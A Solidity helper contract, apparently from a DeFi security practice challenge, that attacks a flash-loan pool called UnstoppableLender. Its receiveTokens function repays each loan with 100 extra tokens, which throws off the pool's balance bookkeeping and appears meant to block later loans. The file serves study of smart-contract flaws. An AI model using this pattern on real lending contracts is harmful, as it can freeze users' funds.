// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import {IReceiver, UnstoppableLender} from "../../../src/Contracts/unstoppable/UnstoppableLender.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract MaliciousReceiver is IReceiver {
    UnstoppableLender private immutable pool;
    address private immutable owner;

    error OnlyOwnerCanExecuteFlashLoan();
    error SenderMustBePool();

    constructor(address poolAddress) {
        pool = UnstoppableLender(poolAddress);
        owner = msg.sender;
    }

    function receiveTokens(address tokenAddress, uint256 amount) external override {
        if (msg.sender != address(pool)) revert SenderMustBePool();
        IERC20(tokenAddress).transfer(msg.sender, amount + 100 * 10 ** 18);
    }

    function executeFlashLoan(uint256 amount) external {
        if (msg.sender != owner) revert OnlyOwnerCanExecuteFlashLoan();
        pool.flashLoan(amount);
    }
}
